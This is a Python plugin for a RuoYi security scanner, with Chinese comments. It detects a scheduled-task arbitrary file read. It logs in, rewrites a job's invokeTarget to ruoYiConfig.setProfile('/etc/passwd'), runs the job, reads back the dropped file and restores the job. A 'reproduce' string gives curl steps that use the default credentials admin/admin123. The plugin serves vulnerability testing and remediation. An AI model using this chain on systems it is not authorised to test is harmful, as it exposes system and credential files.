# 定时任务任意文件读取：登录链 → edit→run 触发 ruoYiConfig.setProfile，再读取落地文件 2.txt
# D1 改造（2026-07-18）：删除硬编码 JSESSIONID + 固定 Content-Length，改用 RuoYiAuthChain 登录拿会话
import json

from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from config import settings
from core.auth_chain import LOGIN_CAPTCHA, isolated_auth_session
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_all
from lib.reporter import emit
from plugins.base import PluginBase

logger = get_logger(__name__)


class FileReadTimePlugin(PluginBase):
    name = "定时任务任意文件读取"
    cve = "N/A"
    severity = "high"
    category = "vuln"
    description = (
        "通过定时任务 edit 修改 invokeTarget 为 ruoYiConfig.setProfile(/etc/passwd)，"
        "run 后读取落地文件 2.txt。需后台鉴权，D1 起改用登录链获取会话"
    )
    fix = "限制定时任务 invokeTarget 参数，禁止调用任意方法；后台强制鉴权"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验，禁止调用 ruoYiConfig）\n"
        "【代码修复】SysJobController.edit() 添加 invokeTarget 白名单：\n"
        '  String[] allowedTargets = {"ryTask.ryParams","ryTask.ryMultipleParams"};\n'
        '  if (!Arrays.asList(allowedTargets).contains(invokeTarget.split("\\(")[0])) throw new ServiceException("非法调用目标");\n'
        "【权限加固】为 /monitor/job/edit 强制鉴权：@PreAuthorize(\"@ss.hasPermi('monitor:job:edit')\")\n"
        "【WAF 规则】拦截 invokeTarget 参数含 ruoYiConfig/java.lang.Runtime 的 /monitor/job/edit 请求\n"
        "【审计】记录所有 /monitor/job/edit 操作日志，定期审计\n"
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 1. 先用默认口令登录获取 token（admin/admin123）：\n"
        'TOKEN=$(curl -s -X POST "http://target/login" -H "Content-Type: application/json" \\\n'
        '  -d \'{"username":"admin","password":"admin123"}\' | grep -oP \'(?<="token":")[^"]+\')\n'
        "\n"
        "# 2. 修改定时任务 invokeTarget 为 ruoYiConfig.setProfile：\n"
        'curl -X POST "http://target/monitor/job/edit" \\\n'
        '  -H "Authorization: Bearer $TOKEN" \\\n'
        "  -d \"jobId=2&jobName=test&invokeTarget=ruoYiConfig.setProfile('/etc/passwd')&cronExpression=0/5+*+*+*+*+?\"\n"
        "\n"
        "# 3. 触发任务执行：\n"
        'curl -X PUT "http://target/monitor/job/run" -H "Authorization: Bearer $TOKEN" -d "jobId=2"\n'
        "\n"
        "# 4. 读取落地文件 2.txt：\n"
        'curl "http://target/2.txt"\n'
        "  # 预期响应：响应体含 /etc/passwd 内容"
    )
    # D2：/monitor/job/edit 白名单在 4.7.0 收紧，setProfile 调用被禁
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        """在**独立会话**中登录后执行定时任务读取链路

        为什么不用传入的共享 session：登录会改变会话认证状态，且该状态会一直保留给
        后续插件（Shiro 把认证存在服务端 session，cookie 快照无法撤销）。而其余插件的
        判定普遍以「未认证基线」为前提，会被污染成误报——2026-09-17 多版本矩阵实测：
        登录链修通后 v4.8.3 一次多出 6 个假 CONFIRMED（备份文件 65 个 / MinIO /
        RocketMQ / Swagger / IDE 残留 / Plus 认证）。
        详见 core/auth_chain.isolated_auth_session 的说明。
        """
        with isolated_auth_session(
            target,
            settings.RuoYiAuth.USERNAME,
            settings.RuoYiAuth.PASSWORD,
            timeout=settings.RuoYiAuth.TIMEOUT,
        ) as (isolated, ok_login, reason):
            return self._verify_authed(target, isolated, ok_login, reason)

    def _verify_authed(self, target, session, ok_login, reason):
        """链路主体（session 为已登录的**隔离会话**）

        链路：list 发现真实 jobId → edit 写入 invokeTarget → run 触发 → 读落地文件 2.txt → 还原

        2026-09-17 多版本矩阵实测后加固（两处）
        ----------------------------------------
        1. **jobId 不再硬编码**。原实现固定 `jobId=4`，而 RuoYi 各版本自带
           sys_job 种子数据只有 job_id 1/2/3（4 个版本实测均为 1,2,3）。
           于是 edit 改的是不存在的任务、run 也没触发，最后读不到文件判 SAFE——
           那是**假阴性**：报告写着「确认不存在」，实际是「目标指错了就放弃」。
           现改为先查任务列表拿真实 jobId；列表中无可用任务时判 UNKNOWN（无法判定），
           不再冒充 SAFE。
        2. **测试后还原任务**，并且每个分支都带 evidence。
           原实现改完任务不留还原动作，SAFE 分支还没有任何证据，结论不可审计。

        @param target: 目标主机，用于拼接各环节接口地址
        @param session: 已登录的隔离会话（非共享会话）
        @param ok_login: 登录是否成功
        @param reason: 登录失败原因
        @return: ScanResult——登录失败/无可用任务为 UNKNOWN；落地文件含 root 与 :/ 为 CONFIRMED；其余 SAFE
        """
        if not ok_login:
            if reason == LOGIN_CAPTCHA:
                emit(no("定时任务任意文件读取（需验证码且 OCR 失败）"))
                return ScanResult(
                    kind="info", name=self.name, status=STATUS_UNKNOWN, evidence=f"登录链验证码 OCR 失败：{reason}"
                )
            emit(no(f"定时任务任意文件读取（登录失败：{reason}）"))
            return ScanResult(kind="info", name=self.name, status=STATUS_UNKNOWN, evidence=f"登录链失败：{reason}")

        # Step 0：发现真实 jobId（不能硬编码——种子数据只有 1/2/3，硬编码 4 会静默空转）
        job = self._discover_job(target, session)
        if job is None:
            emit(no("定时任务任意文件读取（无可用定时任务，无法验证）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=join_url(target, "/monitor/job/list"),
                evidence="登录成功但任务列表为空或不可读，无法构造验证链路，不予判定",
            )
        job_id = str(job.get("jobId"))
        original_target = job.get("invokeTarget") or ""

        # Step 1：编辑任务，写入文件读取载荷
        payload = {
            "jobId": job_id,
            "updateBy": "admin",
            "jobName": job.get("jobName") or "ruoyi_scan_probe",
            "jobGroup": job.get("jobGroup") or "DEFAULT",
            "invokeTarget": "ruoYiConfig.setProfile('/etc/passwd')",
            "cronExpression": job.get("cronExpression") or "0/10 * * * * ?",
            "misfirePolicy": job.get("misfirePolicy") or "1",
            "concurrent": job.get("concurrent") or "1",
            "status": job.get("status") or "1",
            "remark": job.get("remark") or "",
        }
        edited = False
        edit_accepted = False
        try:
            resp_edit = session.post(join_url(target, "/monitor/job/edit"), data=payload)
            edited = True
            edit_accepted = self._edit_accepted(resp_edit)

            # Step 2：运行任务
            session.post(join_url(target, "/monitor/job/run"), data={"jobId": job_id})

            # Step 3：读取落地文件 2.txt
            url2 = join_url(target, "/common/download/resource?resource=2.txt")
            file_install = session.get(url2).text or ""
        except Exception as e:
            emit(no("定时任务任意文件读取（链路异常）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=join_url(target, "/monitor/job"),
                evidence=f"链路请求异常（jobId={job_id}）：{e}",
            )
        finally:
            # 无论成败都还原任务，避免在被测系统上留下改动
            if edited:
                self._restore_job(target, session, payload, original_target)

        # 判定：'root' 与 ':/' 同时出现（使用 match_all 统一判定）
        if match_all(file_install, ["root", ":/"]):
            emit(ok("存在定时任务任意文件读取漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url2,
                evidence=f"落地文件 2.txt 含 root 与 :/ 特征（jobId={job_id}，登录链成功，已还原任务）",
                fix=self.fix,
            )

        if edit_accepted:
            # 载荷被接受（edit 返回操作成功 ⇒ 无白名单/校验）但读回链路未走通。
            # 不能冒充 SAFE——「确认不存在」要求防护生效的证据；这里是「可利用性未证实」。
            # 2026-09-19 在 v4.6.2 实测：edit 接受（无白名单）但 2.txt 读回 0 字节。
            emit(no("定时任务任意文件读取（载荷被接受但读回未完成）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url2,
                evidence=(
                    f"edit 对 jobId={job_id} 写入 invokeTarget 被服务端接受（无白名单校验），"
                    f"但落地文件 2.txt 读回 {len(file_install)} 字节、未含 passwd 特征——"
                    f"读回链路未完成，可利用性未证实，任务已还原"
                ),
            )

        emit(no("不存在定时任务任意文件读取漏洞"))
        return ScanResult(
            kind="info",
            name=self.name,
            status=STATUS_SAFE,
            url=url2,
            evidence=(
                f"edit 对 jobId={job_id} 写入 invokeTarget 被服务端**拒绝**"
                f"（白名单/参数校验生效）⇒ 载荷未进入业务层，任务已还原"
            ),
        )

    @staticmethod
    def _edit_accepted(resp):
        """edit 响应是否为「操作成功」

        接受形态（<=4.6.x，无白名单）：{"msg":"操作成功","code":0}
        拒绝形态（4.7.0+ 白名单）：{"msg":"修改任务'x'失败，目标字符串不在白名单内","code":500}
        HTML 响应（重定向到登录页/权限页）一律视为未接受——那是会话或权限问题，不是判定依据。
        """
        ct = (resp.headers.get("Content-Type") or "").lower()
        if "json" not in ct:
            return False
        try:
            body = resp.json()
        except Exception:
            try:
                body = json.loads(resp.text or "")
            except Exception:
                return False
        if not isinstance(body, dict):
            return False
        code = body.get("code")
        msg = str(body.get("msg", ""))
        return code in (0, 200) and "失败" not in msg and "不在白名单" not in msg

    def _discover_job(self, target, session):
        """查任务列表拿一个真实存在的任务；失败返回 None

        优先挑选 invokeTarget 以 ryTask 开头的示例任务（改写影响面最小），
        否则取第一个。列表接口为 POST /monitor/job/list（RuoYi 4.x 的表格数据源）。
        """
        try:
            resp = session.post(join_url(target, "/monitor/job/list"), data={"pageNum": 1, "pageSize": 50})
            ct = (resp.headers.get("Content-Type", "") or "").lower()
            if "json" not in ct:
                return None
            body = resp.json()
            rows = body.get("rows") or [] if isinstance(body, dict) else []
            if not rows:
                return None
            for row in rows:
                if str(row.get("invokeTarget", "")).startswith("ryTask"):
                    return row
            return rows[0]
        except Exception:
            return None

    def _restore_job(self, target, session, payload, original_target):
        """把任务还原为原始 invokeTarget（尽力而为，失败不影响扫描结论）"""
        try:
            restore = dict(payload)
            restore["invokeTarget"] = original_target
            session.post(join_url(target, "/monitor/job/edit"), data=restore)
        except Exception:
            logger.debug("还原定时任务失败（jobId=%s）", payload.get("jobId"), exc_info=True)
